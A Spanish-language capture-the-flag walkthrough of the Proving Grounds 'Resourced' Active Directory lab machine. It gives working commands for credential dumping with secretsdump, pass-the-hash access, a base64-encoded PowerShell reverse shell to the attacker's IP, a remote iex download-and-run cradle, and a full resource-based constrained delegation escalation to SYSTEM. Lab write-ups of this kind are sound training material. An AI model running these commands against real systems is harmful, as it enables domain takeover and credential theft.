---
layout: post
title: Resourced (Windows / Active Directory - Intermediate) - Proving Grounds Practice
date: 17.06.2025
categories: [Windows, Active Directory, AD, Proving Grounds, Proving Grounds Practice, Walkthrough, OSCP, OSEP, Tutorial]
tag: [Proving Grounds Practice, Proving Grounds, Windows, Active Directory, AD, RBCD, Resource Based Constrained Delegation, Impacket, NetExec, SMB, CIFS, Kerbrute, Kerberos, Enum4Linux, SMBClient, SMBmap, SYSTEM, Impacket-SecretsDump, Evil-WinRM, Pass The Hash, adPEASS, BloodHound, Domain, Domain Enumration, GenericAll, PowerView, PowerMad, msDS-AllowedToActOnBehalfOfOtherIdentity, Delegation, Impacket-GetST, HTTP, NTDS, NTDS.DIT, Intermediate]
image:
  path: assets/img/post-img/PGimage-Title/PG-Title.svg
  alt: 
---
# Resolución paso a paso de la máquina Resourced:

## ENUMERACIÓN

### NMAP

- Realizamos el primer escaneo para ver que puertos están abiertos:

```bash
nmap -p- -n  192.168.172.175 -oG allPorts
```

![image.png](assets/img/post-img/Resourced/image.png)

- Enumeramos los **SERVICIOS ACTIVOS** en los **PUERTOS** que hemos descubierto:

```bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49666,49668,49669,49675,49676,49694,49712 --min-rate 5000 192.168.172.175 -oN targeted
```

![image.png](assets/img/post-img/Resourced/image%201.png)

- En el **OUTPUT** de **NMAP** podemos ver varios puertos y servicios, entre ellos el puerto de **KERBEROS**, **SMB**, **DNS**, **RDP**, **WINRM**.. Evidentemente se trata de un **AD** y podemos ver el **NOMBRE DEL DOMINIO** y el **DC**:

> 
**Domain: resourced.local**  
**DC: RESOURCEDC**  
> 

- Intentamos enumerar con **NETEXEC** pero no logramos encontrar nada interesante:

### NETEXEC

```css
netexec smb 192.168.160.175 -u 'guest' -p '' --shares
```

![image.png](assets/img/post-img/Resourced/image%202.png)

- Realizamos enumeración de usuarios con **KERBRUTE** y logramos descubrir **4 USUARIOS VÁLIDOS** dentro del **DOMINIO**:

### KERBRUTE

[https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)

[https://github.com/attackdebris/kerberos_enum_userlists](https://github.com/attackdebris/kerberos_enum_userlists)

```bash
python kerbrute.py -dc-ip 192.168.172.175 -domain resourced.local -users ./kerberos_enum_userlists/A-Z.Surnames.txt
```

![image.png](assets/img/post-img/Resourced/image%203.png)

> 
**Users:**
> 

```bash
J.JOHNSON
M.MASON
P.PARKER
R.ROBINSON
```

- Decidimos lanzar **ENUM4LINUX** y descubrimos varios **USUARIOS** y lo que parece ser una posible contraseña para el usuario **V.VENZ.** También tenemos información sobre **GRUPOS**, **PASSWORD POLICY**…:

### ENUM4LINUX

```bash
enum4linux 192.168.172.175
```

![image.png](assets/img/post-img/Resourced/image%204.png)

- Nos creamos una lista de **USUARIOS**:

> 
**Users:**
> 

```bash
Administrator
D.Durant
G.Goldberg
Guest
J.Johnson
K.Keen
krbtgt
L.Livingstone
M.Mason
P.Parker
R.Robinson
S.Swanson
V.Ventz
```

- Credenciales **V.VENTZ**:

> 
**User: V.Ventz**  
**Password: HotelCalifornia194!**
> 

- Probamos a lanzar **NETEXEC** con las posibles credenciales que hemos obtenido y parece que funcionan:

![image.png](assets/img/post-img/Resourced/image%205.png)

- Listamos recursos compartidos y parece que podemos acceder y hay un directorio **PASSWORD AUDIT** que parece interesante:

```bash
smbclient -L //192.168.172.175/ -U V.Ventz
```

![image.png](assets/img/post-img/Resourced/image%206.png)

- Vamos a intentar acceder a los recursos compartidos por **SMB** con **SMBCLIENT** y a descargarnos todos los recursos de los directorios **PASSWORD AUDIT** y **REGISTRY**:

```bash
smbclient //192.168.172.175/Password\ Audit -U V.Ventz
```

![image.png](assets/img/post-img/Resourced/image%207.png)

![image.png](assets/img/post-img/Resourced/image%208.png)

- Al tener los  archivos **NTDS.DIT** y **SYSTEM** podemos intentar volcar credenciales con **IMPACKET-SECRETSDUMP**:

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

![image.png](assets/img/post-img/Resourced/image%209.png)

![image.png](assets/img/post-img/Resourced/image%2010.png)

- Parece que ha funcionado y tenemos un buen montón de **HASHES**.  Podemos comprobar si los **HASHES** son válidos con **NETEXEC** creando un archivo **NTDSUSERS** y un archivo **NTDSHASHES**:

- Podemos separar el Output con **AWK**:

### USERS

```bash
cat hashes.txt | awk -F ':' '{print$1}' > ntdsusers
```

![image.png](assets/img/post-img/Resourced/image%2011.png)

### HASHES

```bash
cat hashes.txt | awk -F: '{print $3 ":" $4}' > ntdshashes
```

![image.png](assets/img/post-img/Resourced/image%2012.png)

- Comprobamos con **NETEXEC** si alguno de los **HASHES** nos funciona para acceder a la máquina víctima y parece que hay un usuario **L.LIVINGSTONE** con el que podemos acceder:

```bash
netexec winrm 192.168.172.175 -u ntdsusers -H ntdshashes
```

![image.png](assets/img/post-img/Resourced/image%2013.png)

> 
**User: resourced.local\L.Livingstone**  
**Hash: 19a3a7550ce8c505c2d46b5e39d6f808**
> 

## EXPLOTACIÓN

### EVIL-WINRM

- Intentamos acceder con **EVIL-WINRM** parándole el **HASH** directamente:

```bash
evil-winrm -i 192.168.172.175 -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808'
```

![image.png](assets/img/post-img/Resourced/image%2014.png)

- Ahora podemos desplazarnos al directorio **DESKTOP** y leer la primera **FLAG**:

![image.png](assets/img/post-img/Resourced/image%2015.png)

- Empezamos a enumerar pero no conseguimos encontrar nada interesante.

- Vamos a lanzarnos una **REVERSE SHELL** para poder seguir enumerando con comodidad y poder descargarnos y ejecutar **ADPeass.PS1**:

```bash
pwsh

$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.223",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText =[Convert]::ToBase64String($Bytes)

$EncodedText
```

![image.png](assets/img/post-img/Resourced/image%2016.png)

```bash
powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

![image.png](assets/img/post-img/Resourced/image%2017.png)

![image.png](assets/img/post-img/Resourced/image%2018.png)

- Descargamos e importamos **adPEAS.ps1**:

![image.png](assets/img/post-img/Resourced/image%2019.png)

- Ejecutamos **ADPEASS** y vemos alguna información que puede sernos útil más adelante:

![image.png](assets/img/post-img/Resourced/image%2020.png)

![image.png](assets/img/post-img/Resourced/image%2021.png)

### BLOODHOUND

- Al lanzar **ADPEASS** se nos crea automáticamente un archivo con la recolección de datos que podemos usar para cargarlos en **BLOODHOUND** y analizar más en profundidad el **DOMINIO**. Aprovechamos la sesión de **EVIL-WINRM** para descargarnos el archivo a nuestra máquina local y ejecutamos **BLOODHOUND**:

![image.png](assets/img/post-img/Resourced/image%2022.png)

![image.png](assets/img/post-img/Resourced/image%2023.png)

- Cargamos los datos que hemos recolectado a **BLOODHOUND**:

![image.png](assets/img/post-img/Resourced/image%2024.png)

- Descubrimos que el usuario **L.LIVINGSTON** sobre el que nos encontramos tiene permisos **GENERICALL** sobre **RESOURCEDC** (el **DC**!). El propio **BLOODHOUND** nos da los pasos que podemos seguir para realizar la explotación:

![image.png](assets/img/post-img/Resourced/image%2025.png)

- Pasos que nos ofrece **BLOODHOUND**:

![image.png](assets/img/post-img/Resourced/image%2026.png)

## ESCALADA DE PRIVILEGIOS

- Cargamos **POWERVIEW** y enumeramos por **RBCD** pero no encontramos nada:

```bash
Get-DomainRBCD
```

![image.png](assets/img/post-img/Resourced/image%2027.png)

- Revisamos un poco los apuntes que tengamos o investigamos por internet para saber bien de que va la cosa..

![image.png](assets/img/post-img/Resourced/image%2028.png)

- Comprobamos si hay algún objeto en el dominio que tenga configurado un **SPN** pero solo está la cuenta **KRBTGT** por defecto.

![image.png](assets/img/post-img/Resourced/image%2029.png)

- Ahora nos viene muy bien la información que habíamos obtenido con **ADPEASS** donde nos decía que cualquier usuario  de **AUTENTHICATED USERS** podría añadir una nueva máquina al dominio. Como no hemos encontrado ninuna cuenta con **SPN** y no tenemos control sobre ningún objeto con “**msDS-AllowedToActOnBehalfOfOtherIdentity**”, podemos añadir una nueva máquina al **DOMINIO** y agregarle ese atributo a la nueva máquina para que nos permita realizar el ataque.

![image.png](assets/img/post-img/Resourced/image%2020.png)

- Las instrucciones que nos da **BLOODHOUND** sobre los permisos **GENERICALL** que tenemos sobre el **DC** nos sirven como guía, no obstante cambiaremos un poco la metodología y no usaremos **RUBEUS.** Vamos a utilizar **IMPACKET-GETST** para tener el **TICKET** que nos permita impersonar al usuario **Administrator** en nuestra máquina **KALI** y desde ahí añadiremos el **TICKET** a la variable de entorno **KRB5CCNAME** , añadiremos la **IP** del **DC (Máquina víctima)** al archivo **/ETC/HOSTS** para que apunte correctamente y ejecutaremos **IMPACKET-PSEXEC** con el parámetro **-k** para que cargue el **TICKET** de la variable de entorno que hemos definido. Para que todo salga bien es importante tener cargados en la máquina víctima tanto **POWERVIEW** como **POWERMAD** para los primeros pasos del proceso:

- Vamos a clonarnos el repo de **POWERMAD** y a cargarlo en la máquina víctima (Ya tenemos cargado **PowerView.ps1** del proceso de enumeración previo, pero el proceso es el mismo que con **Powermad.ps1**):

[https://github.com/Kevin-Robertson/Powermad](https://github.com/Kevin-Robertson/Powermad)

![image.png](assets/img/post-img/Resourced/image%2030.png)

- Cargamos **Powermad.ps1** en la máquina víctima:

```bash
iex(new-object net.webclient).DownloadString('http://192.168.45.223:8088/Powermad.ps1')
```

![image.png](assets/img/post-img/Resourced/image%2031.png)

> La primera parte del proceso que vamos a realizar ahora se puede automatizar pero nosotros vamos a hacerlo de forma manual para entender mejor que es lo que está pasando, no obstante hay una herramienta  (RBCD-ATTACK) que realiza todos los primeros pasos:
> 
> 
> [https://github.com/tothi/rbcd-attack/](https://github.com/tothi/rbcd-attack/)
> 

- Ahora vamos a ir ejecutando los comandos que nos indica **BLOODHOUND** paso a paso hasta el punto en que usan **RUBEUS**. (Para facilitar la situación lanzaremos los comandos por defecto conservando tanto el nombre que se le asigna a la máquina que creamos como la contraseña):

```bash
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
```

```bash
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
```

```bash
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

```bash
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

![image.png](assets/img/post-img/Resourced/image%2032.png)

- Ahora vamos a usar I**MPACKET-GETST** desde nuestra máquina **KALI** para continuar con el proceso y consequir tener el **TICKET** en nuestra máquina local. Hay que colocar bien los parámetros como el **SERVICIO** que queremos, el **DC**, el usuario que vamos a impersonar, que en este caso es Administrator, la IP del **DC** y por ultimo el **DOMINIO**, el nombre de la **MÁQUINA** que hemos creado y la **CONTRASEÑA** que hemos definido. (Cuidado con los caracteres especiales, hay que escaparlos con una barra invertida “**\**”):

```bash
impacket-getST -spn cifs/ResourceDC.resourced.local -impersonate Administrator -dc-ip 192.168.172.175 resourced.local/attackersystem$:Summer2018\!
```

![image.png](assets/img/post-img/Resourced/image%2033.png)

- Creamos la variable de entorno **KRB5CCNAME** donde alojamos el **TICKET** para que lo cargue automáticamente cuando nos conectemos con **IMPACKET-PSEXEC**:

```bash
export KRB5CCNAME=Administrator@cifs_ResourceDC.resourced.local@RESOURCED.LOCAL.ccache
```

![image.png](assets/img/post-img/Resourced/image%2034.png)

- Añadimos la I**P** de la máquina víctima dentro del **/ETC/HOSTS** para que apunte al **DC**:

```bash
sudo sh -c 'echo "192.168.172.175 ResourceDC.resourced.local" >> /etc/hosts'
```

- Ejecutamos **IMPACKET-PSEXEC** con el parámetro **-K** contra el **DC** y conseguimos el acceso como **SYSTEM**:

```bash
impacket-psexec -k ResourceDC.resourced.local
```

![image.png](assets/img/post-img/Resourced/image%2035.png)

- Ahora ya podemos ir al escritorio del **ADMINISTRATOR** y leer la última **FLAG**:

![image.png](assets/img/post-img/Resourced/image%2036.png)